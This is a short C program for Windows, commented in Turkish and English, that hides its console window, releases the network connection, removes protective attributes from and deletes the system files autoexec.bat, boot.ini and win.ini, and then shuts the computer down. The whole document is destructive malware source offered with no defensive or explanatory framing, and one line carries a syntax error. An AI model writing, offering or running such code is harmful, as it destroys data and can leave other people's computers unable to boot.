#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

int main() {
   FreeConsole();  //tr:Konsolu gizler en:Hides console
   system("@echo off"); //tr:Komut çıktısını gizler en:Hides command output
   system("IPconfig /release"): //tr:İnterneti kapatır en:Closes internet
  //tr:Sistemi silme en:Deleting system
  system("attrib -r -s -h C:\\autoexec.bat"); 
  system("del C:\\autoexec.bat");
  system("attrib -r -s -h C:\\boot.ini");
  system("del C:\\boot.ini");
  system("attrib -r -s -h C:\\win.ini");
  system("del C:\\win.ini");
  //tr:Bilgisayarı kapatma en:Close computer
  system("shutdown /s");
}
